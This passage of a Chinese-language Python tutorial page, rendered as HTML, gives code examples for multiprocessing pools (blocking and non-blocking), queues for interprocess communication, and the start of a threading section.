data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># 非阻塞式进程</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">task</span><span class=\"token punctuation\">(</span>task_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'开始做任务啦!'</span><span class=\"token punctuation\">,</span> task_name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    start <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\"># 使用 sleep</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    end <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token comment\"># print()</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'完成任务:&#123;&#125;!用时:&#123;&#125;,进程id:&#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>task_name<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>end <span class=\"token operator\">-</span> start<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> os<span class=\"token punctuation\">.</span>getpid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>container <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">callback_func</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    container<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    pool <span class=\"token operator\">=</span> Pool<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    tasks <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'听音乐'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'吃饭'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'洗衣服'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'打游戏'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'散步'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'看孩子'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'做饭'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">for</span> task1 <span class=\"token keyword\">in</span> tasks<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        pool<span class=\"token punctuation\">.</span>apply_async<span class=\"token punctuation\">(</span>task<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>task1<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> callback<span class=\"token operator\">=</span>callback_func<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    pool<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 添加任务结束</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    pool<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> container<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'over!!!!!'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"6-processpool06\"><a class=\"anchor\" href=\"#6-processpool06\">#</a> 6. processpool06</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 阻塞式</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> multiprocessing <span class=\"token keyword\">import</span> Pool</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> 特点：</pre></td></tr><tr><td data-num=\"8\"></td><td><pre> 添加一个执行一个任务，如果一个任务不结束另一个任务就进不来。</pre></td></tr><tr><td data-num=\"9\"></td><td><pre> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre> 进程池：</pre></td></tr><tr><td data-num=\"11\"></td><td><pre> pool = Pool(max)  创建进程池对象</pre></td></tr><tr><td data-num=\"12\"></td><td><pre> pool.apply()  阻塞的</pre></td></tr><tr><td data-num=\"13\"></td><td><pre> pool.apply_async()  非阻塞的</pre></td></tr><tr><td data-num=\"14\"></td><td><pre> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre> pool.close()  </pre></td></tr><tr><td data-num=\"16\"></td><td><pre> pool.join()  让主进程让步</pre></td></tr><tr><td data-num=\"17\"></td><td><pre> </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">task</span><span class=\"token punctuation\">(</span>task_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'开始做任务啦!'</span><span class=\"token punctuation\">,</span> task_name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    start <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\"># 使用 sleep</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    end <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'完成任务:&#123;&#125;!用时:&#123;&#125;,进程id:&#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>task_name<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>end <span class=\"token operator\">-</span> start<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> os<span class=\"token punctuation\">.</span>getpid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    pool <span class=\"token operator\">=</span> Pool<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    tasks <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'听音乐'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'吃饭'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'洗衣服'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'打游戏'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'散步'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'看孩子'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'做饭'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">for</span> task1 <span class=\"token keyword\">in</span> tasks<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        pool<span class=\"token punctuation\">.</span><span class=\"token builtin\">apply</span><span class=\"token punctuation\">(</span>task<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>task1<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    pool<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    pool<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'over!!!!'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"7-queue07\"><a class=\"anchor\" href=\"#7-queue07\">#</a> 7. queue07</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 进程间通信</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> multiprocessing <span class=\"token keyword\">import</span> Queue</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>q <span class=\"token operator\">=</span> Queue<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>q<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span><span class=\"token string\">'A'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>q<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span><span class=\"token string\">'B'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>q<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span><span class=\"token string\">'C'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>q<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span><span class=\"token string\">'D'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>q<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span><span class=\"token string\">'E'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">.</span>qsize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> q<span class=\"token punctuation\">.</span>full<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 判断队列是否满    q.empty ()  判断队列是否是空的</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    q<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span><span class=\"token string\">'F'</span><span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># put () 如果 queue 满了则只能等待，除非有‘空地’则添加成功</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'队列已满！'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># 获取队列的值</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># q.put_nowait()</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># q.get_nowait()</span></pre></td></tr></table></figure><h3 id=\"8-process08\"><a class=\"anchor\" href=\"#8-process08\">#</a> 8. process08</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 进程间通信</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> multiprocessing <span class=\"token keyword\">import</span> Process<span class=\"token punctuation\">,</span> Queue</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> time <span class=\"token keyword\">import</span> sleep</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">download</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    images <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'girl.jpg'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'boy.jpg'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'man.jpg'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> image <span class=\"token keyword\">in</span> images<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'正在下载:'</span><span class=\"token punctuation\">,</span> image<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        q<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getfile</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token builtin\">file</span> <span class=\"token operator\">=</span> q<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;&#125;保存成功！'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'全部保存完毕！'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    q <span class=\"token operator\">=</span> Queue<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    p1 <span class=\"token operator\">=</span> Process<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>download<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    p2 <span class=\"token operator\">=</span> Process<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>getfile<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p1<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    p1<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p2<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    p2<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'00000000000'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"多线程\"><a class=\"anchor\" href=\"#多线程\">#</a> 多线程</h1>\n<p>threading 库</p>\n<h2 id=\"导入方法-2\"><a class=\"anchor\" href=\"#导入方法-2\">#</a> 导入方法</h2>\n<p>import threading</p>\n<h2 id=\"代码-2\"><a class=\"anchor\" href=\"#代码-2\">#</a> 代码</h2>\n<h3 id=\"threading01\"><a class=\"anchor\" href=\"#threading01\">#</a> threading01</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 线程</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  考虑？创建线程？ 如何使用线程？</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   t = threading02.Thread(target=download, name='aa', args=(1,))</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    t.start()</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  线程：</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    新建  就绪  运行  阻塞  结束</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 进程： Process</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># 线程:  Thread</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">from</span> time <span class=\"token keyword\">import</span> sleep</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">download</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    images <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'girl.jpg'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'boy.jpg'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'man.jpg'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">for</span> image <span class=\"token keyword\">in</span> images<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'正在下载:'</span><span class=\"token punctuation\">,</span> image<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'下载&#123;&#125;成功！'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">listenMusic</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    musics <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'大碗宽面'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'土耳其冰淇淋'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'烤面筋'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'烤馒头片'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">for</span> music <span class=\"token keyword\">in</span> musics<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'正在听&#123;&#125;歌！'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>music<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token comment\"># 线程对象</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    t <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>download<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">'aa'</span><span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    t<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    t1 <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>listenMusic<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">'aa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    t1<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token comment\"># n = 1</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token comment\"># while True:</span></pre></td></tr><tr><td 